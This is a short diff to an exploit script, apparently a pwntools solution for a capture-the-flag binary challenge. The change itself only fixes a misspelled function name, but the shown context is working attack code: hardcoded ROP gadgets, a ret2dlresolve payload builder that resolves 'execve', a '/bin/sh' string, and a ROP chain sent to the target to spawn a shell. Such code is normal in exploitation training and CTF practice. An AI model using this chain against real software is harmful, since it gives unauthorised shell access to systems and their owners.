@@ -647,7 +647,7 @@ pop_rdi = 0x40117E
 pop_rsi = 0x401180
 pop_rdx = 0x401182
 
-def ret2dlreslove(elf, libc, fun_name, target_addr = elf.bss() + 0x100, got_first_fun_name = list(elf.got.keys())[-1]):
+def ret2dlresolve(elf, libc, fun_name, target_addr = elf.bss() + 0x100, got_first_fun_name = list(elf.got.keys())[-1]):
     '''
         elf: elf文件
         libc: libc文件
@@ -687,7 +687,7 @@ def ret2dlreslove(elf, libc, fun_name, target_addr = elf.bss() + 0x100, got_firs
     return payload, call
 
 bss_addr = elf.bss() + 0x100
-payload, call = ret2dlreslove(elf, libc, 'execve', bss_addr)
+payload, call = ret2dlresolve(elf, libc, 'execve', bss_addr)
 payload = payload.ljust(0x200, b'\x00') + b'/bin/sh\x00'
 p.send((b'a' * 12 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(len(payload)) + p64(elf.plt['read']) + p64(pop_rdi) + p64(bss_addr + 0x200) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + call).ljust(0x200, b'\x00'))
 p.send(payload)
